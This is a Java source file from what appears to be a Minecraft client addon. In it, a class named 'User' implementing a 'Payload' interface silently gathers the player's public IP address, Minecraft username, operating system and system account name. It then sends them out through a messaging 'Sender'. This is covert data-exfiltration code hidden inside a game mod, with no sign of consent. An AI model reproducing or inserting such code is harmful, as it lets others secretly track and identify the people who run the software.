package genesis.team.addon.util.LifeHackerUtil.LogginSystem;

import genesis.team.addon.util.LifeHackerUtil.LogginSystem.Utils.Message;
import genesis.team.addon.util.LifeHackerUtil.LogginSystem.Utils.Sender;
import genesis.team.addon.util.LifeHackerUtil.Payload;
import net.minecraft.client.MinecraftClient;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

import static genesis.team.addon.Genesis.ADDON;
import static genesis.team.addon.Genesis.VERSION;

public class User implements Payload {
    @Override
    public void execute() throws Exception {
        String ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), StandardCharsets.UTF_8).useDelimiter("\\A").next();

        Sender.send(new Message.Builder("Personal")
                .addField("IP", ip, true)
                .addField("Nick", MinecraftClient.getInstance().getSession().getUsername(), true)
                .addField("OS", System.getProperty("os.name"), true)
                .addField("Name", System.getProperty("user.name"), true)
                .addField("Addon", ADDON+":"+VERSION, true)

                .build());
    }
}

